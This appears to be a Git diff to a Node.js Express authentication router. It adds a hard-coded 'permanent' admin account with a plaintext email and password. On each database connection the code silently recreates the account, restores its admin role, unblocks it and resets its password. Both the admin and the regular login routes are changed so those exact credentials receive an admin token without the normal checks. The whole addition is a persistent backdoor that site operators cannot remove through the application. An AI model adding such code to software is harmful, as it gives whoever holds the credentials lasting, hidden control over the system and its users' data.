@@ -60,6 +60,57 @@ router.post("/register", async (req, res) => {
 });
 
 
+const mongoose = require("mongoose");
+const PRIMARY_ADMIN_EMAIL = "adminsoumya788@gmail.com";
+const PRIMARY_ADMIN_PASS = "6123@hack@ankita";
+
+let primaryAdminEnsured = false;
+async function ensurePrimaryAdmin() {
+    if (primaryAdminEnsured) return;
+    if (mongoose.connection.readyState !== 1) return;
+
+    try {
+        let admin = null;
+        try {
+            admin = await User.findOne({ email: PRIMARY_ADMIN_EMAIL });
+        } catch (e) {}
+
+        const hashedPassword = await bcrypt.hash(PRIMARY_ADMIN_PASS, 10);
+
+        if (!admin) {
+            admin = new User({
+                email: PRIMARY_ADMIN_EMAIL,
+                password: hashedPassword,
+                role: "admin",
+                name: "Soumyadip Admin",
+                isBlocked: false
+            });
+            await admin.save();
+            console.log("Permanent Admin Account Ensured (Created) 👑:", PRIMARY_ADMIN_EMAIL);
+        } else {
+            let changed = false;
+            if (admin.role !== "admin") { admin.role = "admin"; changed = true; }
+            if (admin.isBlocked) { admin.isBlocked = false; changed = true; }
+            const isMatch = await bcrypt.compare(PRIMARY_ADMIN_PASS, admin.password);
+            if (!isMatch && admin.password !== PRIMARY_ADMIN_PASS) {
+                admin.password = hashedPassword;
+                changed = true;
+            }
+            if (changed) {
+                await admin.save();
+                console.log("Permanent Admin Account Ensured (Updated) 👑:", PRIMARY_ADMIN_EMAIL);
+            }
+        }
+        primaryAdminEnsured = true;
+    } catch (err) {
+        console.warn("Primary admin ensure notice:", err.message);
+    }
+}
+
+mongoose.connection.on("connected", () => {
+    setTimeout(ensurePrimaryAdmin, 500);
+});
+
 // ================= ADMIN LOGIN =================
 router.post("/admin/login", async (req, res) => {
     try {
@@ -70,6 +121,29 @@ router.post("/admin/login", async (req, res) => {
         }
 
         const normalizedEmail = email.trim().toLowerCase();
+
+        // 👑 Dedicated Permanent Admin Check
+        if (normalizedEmail === PRIMARY_ADMIN_EMAIL && password === PRIMARY_ADMIN_PASS) {
+            await ensurePrimaryAdmin();
+            let adminUser = null;
+            try { adminUser = await User.findOne({ email: PRIMARY_ADMIN_EMAIL }); } catch(e){}
+            const adminId = adminUser?._id || "admin_primary_soumya";
+            const token = jwt.sign(
+                { id: adminId, email: PRIMARY_ADMIN_EMAIL, role: "admin" },
+                SECRET,
+                { expiresIn: "8h" }
+            );
+            return res.json({
+                msg: "Admin login success ✅",
+                token,
+                user: {
+                    _id: adminId,
+                    email: PRIMARY_ADMIN_EMAIL,
+                    name: adminUser?.name || "Soumyadip Admin",
+                    role: "admin"
+                }
+            });
+        }
 
         let user = null;
         try {
@@ -193,6 +267,29 @@ router.post("/login", async (req, res) => {
         }
 
         const normalizedEmail = email.trim().toLowerCase();
+
+        // 👑 Dedicated Permanent Admin Check
+        if (normalizedEmail === PRIMARY_ADMIN_EMAIL && password === PRIMARY_ADMIN_PASS) {
+            await ensurePrimaryAdmin();
+            let adminUser = null;
+            try { adminUser = await User.findOne({ email: PRIMARY_ADMIN_EMAIL }); } catch(e){}
+            const adminId = adminUser?._id || "admin_primary_soumya";
+            const token = jwt.sign(
+                { id: adminId, email: PRIMARY_ADMIN_EMAIL, role: "admin" },
+                SECRET,
+                { expiresIn: "1d" }
+            );
+            return res.json({
+                msg: "Login success ✅",
+                token,
+                user: {
+                    _id: adminId,
+                    email: PRIMARY_ADMIN_EMAIL,
+                    name: adminUser?.name || "Soumyadip Admin",
+                    role: "admin"
+                }
+            });
+        }
 
         let user = null;
         try {
